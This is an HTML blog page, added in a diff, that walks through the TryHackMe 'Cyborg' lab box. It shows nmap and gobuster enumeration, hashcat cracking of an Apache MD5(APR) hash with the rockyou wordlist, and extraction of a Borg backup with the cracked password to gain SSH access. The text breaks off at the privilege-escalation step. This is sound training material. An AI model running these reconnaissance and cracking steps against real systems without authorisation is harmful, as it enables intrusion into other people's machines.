@@ -1,0 +1,581 @@
+<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://y3ll0weye.github.io/posts/2024-12-25-cyborg/"><meta name="generator" content="Astro v5.7.5"><!-- General Meta Tags --><title>TryHackMe Cyborg | y3ll0weye</title><meta name="title" content="TryHackMe Cyborg | y3ll0weye"><meta name="description" content="A box involving encrypted archives, source code analysis and more. Gain user and root access on this machine."><meta name="author" content="y3ll0weye"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="TryHackMe Cyborg | y3ll0weye"><meta property="og:description" content="A box involving encrypted archives, source code analysis and more. Gain user and root access on this machine."><meta property="og:url" content="https://y3ll0weye.github.io/posts/2024-12-25-cyborg/"><meta property="og:image" content="https://y3ll0weye.github.io/posts/2024-12-25-cyborg/index.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2024-12-23T00:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://y3ll0weye.github.io/posts/2024-12-25-cyborg/"><meta property="twitter:title" content="TryHackMe Cyborg | y3ll0weye"><meta property="twitter:description" content="A box involving encrypted archives, source code analysis and more. Gain user and root access on this machine."><meta property="twitter:image" content="https://y3ll0weye.github.io/posts/2024-12-25-cyborg/index.png"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Cyborg | y3ll0weye","image":"https://y3ll0weye.github.io/posts/2024-12-25-cyborg/index.png","datePublished":"2024-12-23T00:00:00.000Z","author":[{"@type":"Person","name":"y3ll0weye"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="y3ll0weye" href="https://y3ll0weye.github.io/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.BZs-2RF_.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"><link rel="stylesheet" href="/_astro/about.BO8GGUk8.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+[data-astro-image]{width:100%;height:auto;object-fit:var(--fit);object-position:var(--pos);aspect-ratio:var(--w) / var(--h)}[data-astro-image=responsive]{max-width:calc(var(--w) * 1px);max-height:calc(var(--h) * 1px)}[data-astro-image=fixed]{width:calc(var(--w) * 1px);height:calc(var(--h) * 1px)}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: try-hack-me-cyborg; }@layer astro { ::view-transition-old(try-hack-me-cyborg) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(try-hack-me-cyborg) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(try-hack-me-cyborg) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(try-hack-me-cyborg) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: others; }@layer astro { ::view-transition-old(others) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(others) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(others) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(others) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute -top-full left-16 z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-3xl flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:items-center sm:py-6"> <a href="/" class="absolute py-1 text-2xl leading-7 font-semibold whitespace-nowrap sm:static"> y3ll0weye </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ml-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:ml-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="max-w-3xl mx-auto px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-3xl items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-3xl px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> TryHackMe Cyborg </h1> <div class="flex items-center gap-4"> <div class="flex items-end space-x-2 opacity-80 my-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 min-w-[1.375rem]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M16 3v4" /><path d="M8 3v4" /><path d="M4 11h16" /><path d="M7 14h.013" /><path d="M10.01 14h.005" /><path d="M13.01 14h.005" /><path d="M16.015 14h.005" /><path d="M13.015 17h.005" /><path d="M7.01 17h.005" /><path d="M10.01 17h.005" /></svg> <span class="sr-only">Published:</span> <span class="text-sm italic sm:text-base"> <time datetime="2024-12-23T00:00:00.000Z">23 Dec, 2024</time> <span aria-hidden="true"> | </span> <span class="sr-only">&nbsp;at&nbsp;</span> <span class="text-nowrap">07:00 AM</span> </span> </div>  </div> <article id="article" class="mx-auto prose mt-8 max-w-3xl"> <p>This is a writeup documenting my process going through the Cyborg box on TryHackMe. As always we are given an ip address with the goal of submitting the user flag and the root flag. There were a few rabbit holes I dove into in this one but in the end we achieved control.</p>
+<h2 id="enumeration">Enumeration</h2>
+<hr>
+<p>Given an ip address of 10.10.22.231, let’s perform an <code>nmap</code> scan to find open ports.</p>
+<h2 id="nmap-nmap">Nmap #Nmap</h2>
+<hr>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124190814257.png" alt=""></p>
+<ul>
+<li>looks like we need to slow down our scan</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124191226187.png" alt=""></p>
+<ul>
+<li>and scanning for all ports is way too slow</li>
+<li>let’s narrow down our port search</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124191329223.png" alt=""></p>
+<ul>
+<li>ok we didn’t get any new info compared to the last scan but in the top 1000 ports it looks like only port 22 and 80 are open.</li>
+</ul>
+<h2 id="port-80-http">Port 80 #http</h2>
+<hr>
+<p>Looks like http is open on port 80 so let’s give our target a visit.
+<img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124191735853.png" alt=""></p>
+<ul>
+<li>
+<p>the default Apache2 page is up</p>
+</li>
+<li>
+<p>Let’s do a little more <code>nmap</code> enumeration to find version numbers
+—> <code>nmap -vv -A -p 80 10.10.22.231</code>
+<img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124192329554.png" alt=""></p>
+</li>
+<li>
+<p>Apache httpd 2.4.18</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124192556234.png" alt=""></p>
+<ul>
+<li>uhhh looks like we don’t need a directory brute forcer because /admin is just open for us.</li>
+</ul>
+<p>Going to the Admins page we see,
+<img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124193010816.png" alt=""></p>
+<ul>
+<li>config files laying about</li>
+<li>music_archive file</li>
+<li>there is no scrollbar but scrolling to the left shows just the end of the sentence and nothing more</li>
+<li>do the hashtags mean anything?</li>
+</ul>
+<p>From the main /admin page we can click on Archive which will give us a .tar file download.
+<img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124193912828.png" alt=""></p>
+<ul>
+<li>.tar file is a file that collects many files into one archive file for distribution or backup purposes</li>
+</ul>
+<p>Upon trying to open the file with mousepad we see this,
+<img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124194519178.png" alt=""></p>
+<ul>
+<li>when catting the file we do not get this info</li>
+<li>is this id and key important information?</li>
+</ul>
+<h2 id="port-22-ssh">Port 22 #ssh</h2>
+<hr>
+<p>While we mull over our findings let’s try and glean some info from ssh on port 22.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124200542366.png" alt=""></p>
+<ul>
+<li>ok ssh is confirmed open</li>
+<li>once we guess a password we are moving onto the exploitation phase so best not to yet</li>
+</ul>
+<p>—> <code>nmap -vv -A -p 22 10.10.22.231</code>
+<img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124201155594.png" alt=""></p>
+<ul>
+<li>we glean the version info</li>
+<li>and the ssh-hostkey info, is this normal?</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124201510546.png" alt=""></p>
+<ul>
+<li>looks like this ssh is using RSA which is a type of asymmetric cryptography meaning the public key visibility is totally normal</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241124202323400.png" alt=""></p>
+<ul>
+<li>OpenSSH 7.2 has an exploit on Exploit-DB</li>
+</ul>
+<h1 id="scrappy-enumeration">Scrappy enumeration</h1>
+<hr>
+<p>Now that we have done some basic enumeration, let’s follow up on that .tar file we downloaded.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241126210810908.png" alt=""></p>
+<ul>
+<li><code>tar -ztvf</code> is attempting to list the contents of the .tar file</li>
+<li><code>tar -xvzf</code> is attempting to unzip the .tar file</li>
+</ul>
+<p>The problem we are running into is that both .tar and .tar.gz endings seem to not be the right formatting.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241127231050334.png" alt=""></p>
+<ul>
+<li>viewing the  /admin page source further we seem to find a few hashes</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241127232048762.png" alt=""></p>
+<ul>
+<li>potential code for an ssh exploit</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241203114015193.png" alt=""></p>
+<ul>
+<li><code>searchsploit</code> shows us an exploit for our openSSH version</li>
+</ul>
+<h2 id="ssh-exploitation-metasploit">SSH Exploitation #Metasploit</h2>
+<hr>
+<p>The Exploit-DB exploits are in the directory <code>/usr/share/exploitdb/exploits</code>. We copy the exploit into our folder of choice.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241203123248946.png" alt=""></p>
+<ul>
+<li>ok to run this command we specify the user or userlist and then the host</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241203124211810.png" alt=""></p>
+<ul>
+<li>why is there an error in the exploit?</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241203124501169.png" alt=""></p>
+<ul>
+<li>great</li>
+<li>well we can change this easily enough in our script</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241203125543108.png" alt=""></p>
+<ul>
+<li>this OpenSSH timing attack is based on invalid and valid usernames having different response times for authentication</li>
+<li>the timing for the username Alex indicates that is probably not a user</li>
+</ul>
+<h2 id="directory-busting-gobuster">Directory busting #gobuster</h2>
+<hr>
+<p>We’ve kind of hit a roadblock with SSH and we shouldn’t assume that /admin is the only directory on port 80. Let’s do a <code>gobuster</code> scan and try to tackle the webpage on port 80</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241205234817135.png" alt=""></p>
+<ul>
+<li>some interesting directories besides /admin</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241205235715502.png" alt=""></p>
+<ul>
+<li>/etc shows us a directory on the server</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241206000036431.png" alt=""></p>
+<ul>
+<li>a file in the /etc directory gives us a password and the term music_archive shows up again</li>
+<li>using the <code>hash-identifier</code> tool we find that the password is a possible MD5(APR) hash.</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241206002559098.png" alt=""></p>
+<ul>
+<li>the other file on the webserver</li>
+</ul>
+<p>We can possibly use #hashcat to crack the hash, we have a lot of other information that we have gathered as well like the sha384 and 512 hashes in the source code but I’m not sure how to use it.</p>
+<p>Doing some research on md5(APR) it looks to be an md5 hash specifically for Apache web servers,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241207000903986.png" alt=""></p>
+<ul>
+<li>the password we found on our webserver fits this format</li>
+</ul>
+<p>Entering <code>hashcat -h | grep apr</code> we see,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241207002540907.png" alt=""></p>
+<ul>
+<li>1600 is the mode so we need to run (<code>-m 1600</code>) to let the program know we are attacking this specific hash</li>
+</ul>
+<p>Running, <code>hashcat -m 1600 justthepasswd.txt /usr/share/wordlists/rockyou.txt</code> we are told, <em>”* Device #1: Not enough allocatable device memory for this attack.”</em> which is unfortunate. Even the <code>-O</code> flag which should optimize this process does not help us.</p>
+<p>Doubling our VM’s allocated memory and running the same command we crack the hash in about 10 seconds,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209190910399.png" alt=""></p>
+<ul>
+<li>hash cracked</li>
+</ul>
+<h2 id="borg-backup-borg">Borg Backup #borg</h2>
+<hr>
+<p>Somewhere somehow we managed to extract the <code>archive.tar</code> file,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209193704418.png" alt=""></p>
+<ul>
+<li>the contents of <code>archive.tar</code></li>
+<li>what is a Borg Backup repo?</li>
+</ul>
+<p>Visiting the documentation page we are told that Borg is a backup program with the purpose of compressing or encrypting files. We will need to install the <code>borgbackup</code> package to use it in the command line.</p>
+<p>After some trouble with the install (needed to update the <code>apt-get</code> command) we acquire <code>borg</code>,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209195724480.png" alt=""></p>
+<ul>
+<li>the command seems to be working as intended</li>
+</ul>
+<p>Going back to the borg documentation it seems the option we need is <em>borg info</em>,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209203321276.png" alt=""></p>
+<ul>
+<li>we need to run the command <code>borg info .</code> (. specifies the folder we are in)</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209203502187.png" alt=""></p>
+<ul>
+<li>and we are prompted with a password</li>
+<li>let’s try the only password we know which is <code>squidward</code></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209203826636.png" alt=""></p>
+<ul>
+<li>interesting, not sure this is what I wanted</li>
+<li>maybe we run a different <code>borg</code> command?</li>
+</ul>
+<p>What about borg extract? I thought the files were already extracted from the archive but then why would would the “extracted” files lead us to the borg documentation?</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209205508265.png" alt=""></p>
+<ul>
+<li>after finally getting the syntax correct we are prompted with the password again</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209205927057.png" alt=""></p>
+<ul>
+<li>this wasn’t here before…</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209210021908.png" alt=""></p>
+<ul>
+<li>a secret file?</li>
+<li>is this what we’ve been searching for?</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209210622889.png" alt=""></p>
+<ul>
+<li>nope</li>
+<li>we still have a lot of folders to look in though</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209211904704.png" alt=""></p>
+<ul>
+<li>the four-billionth password we have seen</li>
+<li>there is nothing else in any of the other folders</li>
+<li>the only place i can think of to use this password is OpenSSH</li>
+</ul>
+<h2 id="openssh-login-ssh">OpenSSH login #ssh</h2>
+<hr>
+<p>Let’s attempt to login with the credentials we found,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209212756489.png" alt=""></p>
+<ul>
+<li>the username is valid…</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209212925875.png" alt=""></p>
+<ul>
+<li>lets go!</li>
+<li>no need for any fancy ssh exploitation we’re in</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241209213133057.png" alt=""></p>
+<ul>
+<li>we got the user flag!</li>
+</ul>
+<h1 id="privilege-escalation-privesc">Privilege Escalation #privesc</h1>
+<hr>
+<p>We have user access to ssh so let’s poke around our new domain and try and find some clues. Let’s start with the ssh config file?</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241210210907439.png" alt=""></p>
+<ul>
+<li>two config files and a lot of key files</li>
+<li>what is the difference between <code>ssh_config</code> and <code>sshd_config</code> ?</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241210211356920.png" alt=""></p>
+<ul>
+<li>hmmm I think the server config is what we should focus on</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241210211949376.png" alt=""></p>
+<ul>
+<li>we tried :/</li>
+</ul>
+<p>Reading up on ssh privilege escalation we learn that there is two ways to exploit SSH keys,</p>
+<ol>
+<li>Reading private keys</li>
+<li>Writing to public keys</li>
+</ol>
+<p>The 1st option allows you to authenticate to the server as the root user and the 2nd option allows you to create your own key, bypassing the security check.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241210214137114.png" alt=""></p>
+<ul>
+<li>we do not have privileges for reading private keys or writing to public keys</li>
+</ul>
+<p>Upon finishing my final exams for the semester I realize we should do enumeration for the privilege escalation phase as well.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241222220735748.png" alt=""></p>
+<ul>
+<li>#commands</li>
+</ul>
+<p>Starting of with the <code>id</code> command,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241222224144893.png" alt=""></p>
+<ul>
+<li>the groups we belong to is interesting specifically <code>adm</code> but I’m not sure what do do with this information</li>
+</ul>
+<p>The <code>sudo-l</code> command catches my eye,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241222225444961.png" alt=""></p>
+<ul>
+<li>we seem to have access to a script</li>
+</ul>
